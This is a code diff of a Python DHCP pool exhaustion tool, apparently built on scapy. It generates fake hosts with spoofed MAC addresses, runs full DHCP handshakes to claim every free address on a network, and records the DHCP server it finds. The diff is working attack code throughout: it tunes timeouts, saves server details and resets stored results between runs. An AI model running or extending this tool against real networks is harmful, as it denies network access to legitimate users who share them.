@@ -21,6 +21,7 @@ from utils import setup_logging, write_to_log, file_semaphore
 timeout_to_receive_dhcp_response = 10 # Time to wait until non response is decided
 unanswered_discovers_to_conclude_exhaustion = 3
 catch_and_release = False # Debug mode. Pool exhaustion + save results + Load results + Release + Save results
+
 base_dir = Path(__file__).resolve().parent
 log_file = base_dir / "logs" / "pool_exhaustion.log"
 #log_file = "logs/pool_exhaustion.log"
@@ -31,6 +32,7 @@ setup_logging(log_file)
 
 
 #### FUNCTIONS #### ----------------------------------------------------------------
+
 def update_json_file(updated_ip_dict, file_path):
     """
     Update json file with new information.
@@ -90,10 +92,30 @@ def check_if_spoof_is_needed(available_hosts, network):
         except Exception as e:
             write_to_log(f"An unexpected error occurred: {str(e)}")
 
+        # Also flush known router JSON file
+        try:
+            save_to_json({}, router_file, file_semaphore)
+        except FileNotFoundError as e:
+            write_to_log(str(e))
+        except json.JSONDecodeError as e:
+            write_to_log(f"Error decoding JSON file: {str(e)}")
+        except Exception as e:
+            write_to_log(f"An unexpected error occurred: {str(e)}")
+
+        # Also flush known hosts JSON file
+        try:
+            save_to_json({}, hosts_file, file_semaphore)
+        except FileNotFoundError as e:
+            write_to_log(str(e))
+        except json.JSONDecodeError as e:
+            write_to_log(f"Error decoding JSON file: {str(e)}")
+        except Exception as e:
+            write_to_log(f"An unexpected error occurred: {str(e)}")
+
         write_to_log(f"Previous results' network changed. Trying to spoof all available IP addresses on actual network")
+
         return available_hosts
     
-
     try:
 
         clean_host_dict = remove_expired_spoofed_hosts(spoofed_ip_dict)
@@ -108,8 +130,6 @@ def check_if_spoof_is_needed(available_hosts, network):
 
         # Removing already spoofed addresses from all available IP addresses list 
         available_hosts[:] = [ip for ip in available_hosts if ip not in clean_host_dict]
-        #for ip, _ in clean_host_dict.items():
-        #    available_hosts.remove(ip)
         
         # Removing our own IP address from spoofing
         available_hosts.remove(our_ip_address)
@@ -131,12 +151,15 @@ def remove_expired_spoofed_hosts(host_dict):
     addresses_with_expired_spoof = []
     # Check if spoof is out-to-date by comparing acquisition time with lease renewal time
     for ip, host in host_dict.items():
+        '''
         # If it's router/DHCP server, ignore it
         if host.is_server:
             pass
+        '''
         # Comparing acquisition time to time now
         time_diff = (time_now - host.acquisition_time).total_seconds()
         if time_diff > host.lease_time or not host.is_spoofed:
+        #if time_diff > host.lease_time:
             addresses_with_expired_spoof.append(ip)
             '''
             # Making sure it's not DHCP server
@@ -309,7 +332,8 @@ def pool_exhaustion_with_discover(number):
         # Create a new bogus host
         host = fake_host.create_host()
 
-        acquisition_successfull = perform_dhcp_discover_offer(host)
+        # Perform DORA handshake to obtain an IP address
+        acquisition_successfull = perform_dhcp_discover_offer(host, timeout_to_receive_dhcp_response)
 
         if acquisition_successfull:
             spoofed_ips_counter += 1
@@ -322,7 +346,7 @@ def pool_exhaustion_with_discover(number):
     return spoofed_ips_counter
 
 
-def perform_dhcp_discover_offer(host):
+def perform_dhcp_discover_offer(host, timeout):
     """
     Perform a DHCP Discover-Offer transaction. 
     If a DHCP Offer is received, continues with Request-ACK
@@ -336,7 +360,7 @@ def perform_dhcp_discover_offer(host):
     write_to_log(f"DHCP Discover sent: {host.mac_address} requesting a new IP address")
 
     # Waits until timeout or DHCP Response is received
-    dhcp_discover_response = process_dhcp_packet(dhcp_discover_packet[scapy.BOOTP].xid, timeout_to_receive_dhcp_response)
+    dhcp_discover_response = process_dhcp_packet(dhcp_discover_packet[scapy.BOOTP].xid, timeout)
 
     if dhcp_discover_response:
 
@@ -346,10 +370,36 @@ def perform_dhcp_discover_offer(host):
 
         if response_type == "OFFER":
 
-            #print(f"Offer received")
             write_to_log(f"DHCP Offer received: {host.mac_address} offered {host.ip_address}")
+
+            # Getting DHCP server parameters from received DHCP Offer
+            global dhcp_server_ip
+            if not dhcp_server_ip:
+
+                dhcp_opts = get_dhcp_options(dhcp_discover_response)
+                #print(f"{dhcp_opts}")
+
+                dhcp_server_instance = dhcp_server.create_server(dhcp_opts["server_id"], "")
+
+                dhcp_server_ip = dhcp_server_instance.ip_address
+
+                write_to_log(f"Found DHCP server at {dhcp_server_ip}")
+
+                dhcp_server_dict = {}
+                dhcp_server_dict[dhcp_server_ip] = dhcp_server_instance.to_dict()
+
+                # Save new dhcp server information to JSON file
+                #serializable_dict = {ip: dhcp_server_object.to_dict() for ip, dhcp_server_object in dhcp_server_dict.items()}
+
+                try:
+                    with file_semaphore:
+                        with open(router_file, 'w') as file:
+                            json.dump(dhcp_server_dict, file, indent=4)
+                except Exception as e:
+                    write_to_log(f"Error saving JSON file: {e}")
+
             # Return True if ip acquisition is successful
-            return perform_dhcp_request_ack(host)
+            return perform_dhcp_request_ack(host, timeout)
 
         elif response_type == "ACK":
 
@@ -373,19 +423,19 @@ def perform_dhcp_discover_offer(host):
         return
     
 
-def perform_dhcp_request_ack(host):
+def perform_dhcp_request_ack(host, timeout):
     """
     Completes the DHCP handshake process after receiving a DHCP Offer
     """
 
     # If Discover-Offer occurs, continue with DORA handshake
-    dhcp_request_packet = create_broadcast_dhcp_request_packet(host)
+    dhcp_request_packet = create_broadcast_dhcp_request_packet(host, dhcp_server_ip)
     # Send DHCP Request
     scapy.sendp(dhcp_request_packet, verbose=False, iface=iface)
     write_to_log(f"DHCP Request sent: {host.mac_address} requesting {host.ip_address}")
 
     # Waits until timeout or DHCP Response is received
-    dhcp_request_response = process_dhcp_packet(dhcp_request_packet[scapy.BOOTP].xid, timeout_to_receive_dhcp_response)
+    dhcp_request_response = process_dhcp_packet(dhcp_request_packet[scapy.BOOTP].xid, timeout)
 
     # If there's response
     if dhcp_request_response:
